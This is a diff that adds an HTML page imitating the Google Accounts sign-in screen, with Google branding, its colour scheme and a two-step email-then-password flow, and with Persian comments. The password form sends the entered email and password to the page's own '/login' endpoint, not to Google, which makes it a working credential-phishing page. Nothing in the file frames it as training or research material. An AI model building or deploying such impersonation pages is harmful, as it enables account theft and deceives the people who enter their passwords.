@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+        body {
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #202124;
+        }
+        .login-container {
+            width: 100%;
+            max-width: 450px;
+            padding: 48px 40px 36px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            margin: 20px;
+        }
+        .google-logo {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        .google-logo svg {
+            width: 75px;
+        }
+        .step-header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .step-header h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+        }
+        .step-header p {
+            font-size: 16px;
+            color: #5f6368;
+        }
+        .form-step {
+            display: none;
+        }
+        .form-step.active {
+            display: block;
+        }
+        .input-field {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-bottom: 24px;
+            transition: border-color 0.2s;
+        }
+        .input-field:focus {
+            outline: none;
+            border-color: #1a73e8;
+        }
+        .buttons-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .link-button {
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .link-button:hover {
+            text-decoration: underline;
+        }
+        .primary-button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .primary-button:hover {
+            background-color: #0d62d9;
+        }
+        .user-email-display {
+            text-align: center;
+            background-color: #f8f9fa;
+            padding: 12px 16px;
+            border-radius: 24px;
+            margin-bottom: 24px;
+            font-size: 14px;
+            font-weight: 500;
+            display: inline-block;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 32px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        .footer select {
+            border: 1px solid #dadce0;
+            border-radius: 2px;
+            padding: 4px 8px;
+            color: #5f6368;
+            font-size: 12px;
+            margin-left: 8px;
+        }
+        .language-selector {
+            margin-top: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="google-logo">
+            <!-- لوگوی گوگل -->
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 75 24" width="75" height="24">
+                <path d="M10.2 12c0-1.3.4-2.3 1.2-3.1.8-.8 1.8-1.2 3.1-1.2 1.3 0 2.3.4 3.1 1.2.8.8 1.2 1.8 1.2 3.1 0 1.3-.4 2.3-1.2 3.1-.8.8-1.8 1.2-3.1 1.2-1.3 0-2.3-.4-3.1-1.2-.8-.8-1.2-1.8-1.2-3.1zm2.4 0c0 .7.2 1.3.6 1.7.4.4 1 .6 1.7.6s1.3-.2 1.7-.6c.4-.4.6-1 .6-1.7s-.2-1.3-.6-1.7c-.4-.4-1-.6-1.7-.6s-1.3.2-1.7.6c-.4.4-.6 1-.6 1.7z" fill="#1a73e8"/>
+                <path d="M30.2 12c0-1.3.4-2.3 1.2-3.1.8-.8 1.8-1.2 3.1-1.2 1.3 0 2.3.4 3.1 1.2.8.8 1.2 1.8 1.2 3.1 0 1.3-.4 2.3-1.2 3.1-.8.8-1.8 1.2-3.1 1.2-1.3 0-2.3-.4-3.1-1.2-.8-.8-1.2-1.8-1.2-3.1zm2.4 0c0 .7.2 1.3.6 1.7.4.4 1 .6 1.7.6s1.3-.2 1.7-.6c.4-.4.6-1 .6-1.7s-.2-1.3-.6-1.7c-.4-.4-1-.6-1.7-.6s-1.3.2-1.7.6c-.4.4-.6 1-.6 1.7z" fill="#ea4335"/>
+                <path d="M50.2 12c0-1.3.4-2.3 1.2-3.1.8-.8 1.8-1.2 3.1-1.2 1.3 0 2.3.4 3.1 1.2.8.8 1.2 1.8 1.2 3.1 0 1.3-.4 2.3-1.2 3.1-.8.8-1.8 1.2-3.1 1.2-1.3 0-2.3-.4-3.1-1.2-.8-.8-1.2-1.8-1.2-3.1zm2.4 0c0 .7.2 1.3.6 1.7.4.4 1 .6 1.7.6s1.3-.2 1.7-.6c.4-.4.6-1 .6-1.7s-.2-1.3-.6-1.7c-.4-.4-1-.6-1.7-.6s-1.3.2-1.7.6c-.4.4-.6 1-.6 1.7z" fill="#4285f4"/>
+                <path d="M70.2 12c0-1.3.4-2.3 1.2-3.1.8-.8 1.8-1.2 3.1-1.2 1.3 0 2.3.4 3.1 1.2.8.8 1.2 1.8 1.2 3.1 0 1.3-.4 2.3-1.2 3.1-.8.8-1.8 1.2-3.1 1.2-1.3 0-2.3-.4-3.1-1.2-.8-.8-1.2-1.8-1.2-3.1zm2.4 0c0 .7.2 1.3.6 1.7.4.4 1 .6 1.7.6s1.3-.2 1.7-.6c.4-.4.6-1 .6-1.7s-.2-1.3-.6-1.7c-.4-.4-1-.6-1.7-.6s-1.3.2-1.7.6c-.4.4-.6 1-.6 1.7z" fill="#fbbc04"/>
+            </svg>
+        </div>
+
+        <!-- مرحله اول: وارد کردن ایمیل -->
+        <div id="step1" class="form-step active">
+            <div class="step-header">
+                <h1>Sign in</h1>
+                <p>Use your Google Account</p>
+            </div>
+
+            <form id="emailForm">
+                <input type="email" class="input-field" id="email" name="email" placeholder="Email or phone" required autocomplete="username">
+                <div class="buttons-container">
+                    <a href="#" class="link-button">Create account</a>
+                    <button type="submit" class="primary-button">Next</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- مرحله دوم: وارد کردن رمز عبور -->
+        <div id="step2" class="form-step">
+            <div class="user-email-display" id="displayEmail">email@example.com</div>
+            <div class="step-header">
+                <h1>Welcome</h1>
+                <p>Enter your password</p>
+            </div>
+
+            <form id="passwordForm" action="/login" method="post">
+                <input type="hidden" id="hiddenEmail" name="email">
+                <input type="password" class="input-field" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
+                <div class="buttons-container">
+                    <a href="#" class="link-button">Forgot password?</a>
+                    <button type="submit" class="primary-button">Next</button>
+                </div>
+            </form>
+        </div>
+
+        <div class="footer">
+            <div class="language-selector">
+                English (United States)
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('emailForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            document.getElementById('displayEmail').textContent = email;
+            document.getElementById('hiddenEmail').value = email;
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+        });
+    </script>
+</body>
+</html>
